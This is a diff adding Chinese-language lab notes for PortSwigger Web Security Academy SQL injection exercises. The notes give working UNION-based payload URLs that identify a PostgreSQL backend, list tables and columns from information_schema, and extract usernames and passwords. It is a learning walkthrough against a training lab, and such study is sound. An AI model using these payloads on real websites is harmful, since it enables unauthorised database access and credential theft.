@@ -33,3 +33,16 @@
 
 `https://xxxxxxx.web-security-academy.net/filter?category=Accessories%27+union+select+1,@@version--+`
 
+你也可以使用`version()`来替代`@@version`，这是我在下一个Lab中发现的，`version()`适用于所有非Oracle的数据库，但`@@version`仅适用于MySQL和Microsoft。
+
+## SQL injection attack, listing the database contents on non-Oracle databases
+
+> 可以先通过注入查询数据库得到用户名密码，最后再登录。
+
+可以通过`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+union+select+%271%27,version()--+`来进行初步测试，确定后端为`PostgreSQL`。
+
+同样使用[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)中的Payload，我们可以通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,table_name+from+information_schema.tables--+`查看数据库表名，使用`ABC`这个不存在的category是为了去掉原本正常的数据。
+
+搜索关键字`user`，挑选一个可能性较大的表，例如`pg_user`，通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,column_name+from+information_schema.columns+where+table_name=%27pg_user%27--+`查询其列名，会发现有`usename`和`passwd`两列。
+
+最后通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+usename,passwd+from+pg_user--+`，但是发现这里只有两个用户`peter`和`postgres`，所以我们表找错了。最后再查看一次所有表，觉得`users_alyjev`可能也较大，进行查询后得到用户名密码，登录即可。
